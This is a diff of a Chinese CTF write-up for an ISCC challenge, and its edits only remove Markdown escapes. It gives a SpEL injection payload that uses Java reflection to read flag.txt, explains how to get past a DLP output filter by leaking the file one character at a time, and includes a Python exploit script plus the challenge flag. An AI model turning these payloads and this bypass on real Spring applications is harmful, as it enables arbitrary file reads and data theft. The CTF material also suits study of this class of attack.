@@ -39,12 +39,12 @@ Class.forName("java.nio.file.Paths")
 1.  
 
 > **获取** Class.forName(String)\
-> ''.class.class 拿到的是 java.lang.Class 的 Class 对象，它身上的 methods\[2\] 恰好就是 forName(String) 这个静态方法。
+> ''.class.class 拿到的是 java.lang.Class 的 Class 对象，它身上的 methods[2] 恰好就是 forName(String) 这个静态方法。
 
 1.  2.  
 
 > **获取** Paths.get(String)\
-> 拿到 forName 的 Method 后，调用它加载 java.nio.file.Paths，再取其 methods\[0\] 即为 get(String)。
+> 拿到 forName 的 Method 后，调用它加载 java.nio.file.Paths，再取其 methods[0] 即为 get(String)。
 
 1.  2.  
 
@@ -57,26 +57,26 @@ Class.forName("java.nio.file.Paths")
 
 {
 
-\#cf=''.class.class.methods\[2\],
+\#cf=''.class.class.methods[2],
 
-\#pm=\#cf('java.nio.file.Paths').methods\[0\],
+\#pm=\#cf('java.nio.file.Paths').methods[0],
 
 \#path=\#pm('flag.txt'),
 
-\#m=\#cf('java.nio.file.Files').declaredMethods\[61\],
+\#m=\#cf('java.nio.file.Files').declaredMethods[61],
 
 \#m(\#path)
 
-}\[4\]
+}[4]
 
-花括号 {...}\[4\] 的写法是利用 SpEL 的集合字面量语法——内部是一个变量定义链，最后一个表达式 \#m(\#path) 的返回值位于索引 4，取出来就是我们想要的文件内容。
+花括号 {...}[4] 的写法是利用 SpEL 的集合字面量语法——内部是一个变量定义链，最后一个表达式 \#m(\#path) 的返回值位于索引 4，取出来就是我们想要的文件内容。
 
 绕过 DLP
 --------
 
 直接提交上述表达式，服务器返回的不是 flag 内容，而是：
 
-\[DLP System\] Warning: Sensitive flag format detected in output stream. Blocked!
+[DLP System] Warning: Sensitive flag format detected in output stream. Blocked!
 
 后端对输出流做了正则匹配，一旦检测到 ISCC{...} 格式就直接拦截。因此不能一次性读出全文。
 
@@ -86,7 +86,7 @@ Class.forName("java.nio.file.Paths")
 
 <!-- -->
 
-1.  获取长度后，循环地用 \[i\] 下标逐个取出字符
+1.  获取长度后，循环地用 [i] 下标逐个取出字符
 
 2.  将字符拼接即可恢复完整 flag
 
@@ -99,51 +99,51 @@ import requests
 
 BASE = "http://39.105.213.28:12603/api/route"
 
-FOR\_NAME = "''.class.class.methods\[2\]"
+FOR_NAME = "''.class.class.methods[2]"
 
-PATHS\_GET = "\#cf('java.nio.file.Paths').methods\[0\]"
+PATHS_GET = "\#cf('java.nio.file.Paths').methods[0]"
 
-FILES\_READ\_STRING = "\#cf('java.nio.file.Files').declaredMethods\[61\]"
+FILES_READ_STRING = "\#cf('java.nio.file.Files').declaredMethods[61]"
 
 def query(expr: str) -&gt; str:
 
 r = requests.get(BASE, params={"expr": expr}, timeout=20)
 
-r.raise\_for\_status()
+r.raise_for_status()
 
 return r.text
 
-def file\_read\_expr() -&gt; str:
+def file_read_expr() -&gt; str:
 
 return (
 
 "{"
 
-f"\#cf={FOR\_NAME},"
+f"\#cf={FOR_NAME},"
 
-f"\#pm={PATHS\_GET},"
+f"\#pm={PATHS_GET},"
 
 "\#path=\#pm('flag.txt'),"
 
-f"\#m={FILES\_READ\_STRING},"
+f"\#m={FILES_READ_STRING},"
 
 "\#m(\#path)"
 
-"}\[4\]"
+"}[4]"
 
 )
 
-if \_\_name\_\_ == "\_\_main\_\_":
+if __name__ == "__main__":
 
-read\_file = file\_read\_expr()
+read_file = file_read_expr()
 
-n = int(query(read\_file + ".bytes.length"))
+n = int(query(read_file + ".bytes.length"))
 
 result = ""
 
 for i in range(n):
 
-ch = query(f"{read\_file}\[{i}\]")
+ch = query(f"{read_file}[{i}]")
 
 if ch == "\\n":
 
@@ -156,4 +156,4 @@ print(result)
 输出
 ----
 
-ISCC{SpEL\_D0ubl3\_Enc0d1ng\_Bypass\_202605}
+ISCC{SpEL_D0ubl3_Enc0d1ng_Bypass_202605}
